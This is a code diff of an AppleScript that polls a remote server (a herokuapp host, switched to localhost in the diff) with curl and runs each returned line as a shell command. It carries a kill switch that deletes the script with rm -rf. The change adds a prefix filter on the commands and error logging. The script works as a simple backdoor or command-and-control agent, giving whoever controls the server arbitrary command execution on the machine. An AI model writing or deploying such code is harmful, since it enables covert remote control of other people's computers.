@@ -21,10 +21,11 @@
 
 *)
 
-set remoteURL to "http://damp-journey-2734.herokuapp.com/remote.txt"
+--set remoteHost to "http://damp-journey-2734.herokuapp.com"
+set remoteHost to "http://localhost:5000"
+set commandURL to remoteHost & "/remote.txt"
 try
-	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")
-
+	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
 	if (item 1 of commandArgs) is "true" then -- Kill
 		try
 			do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
@@ -35,13 +36,16 @@ try
 	else
 		if (count of commandArgs) > 2 then
 			repeat with a from 3 to (count of commandArgs)
-				try
-					do shell script (item a of commandArgs) -- Run commands
-				end try
+				if (item a of commandArgs) starts with "C-" or (item a of commandArgs) starts with "A-"
+					try
+						do shell script (characters 3 thru -1 of (item a of commandArgs) as string) -- Run commands
+					end try
+				end if
 			end repeat
 		end if
 	end if
-on error
+on error err
+	log err
 	return
 end try
 
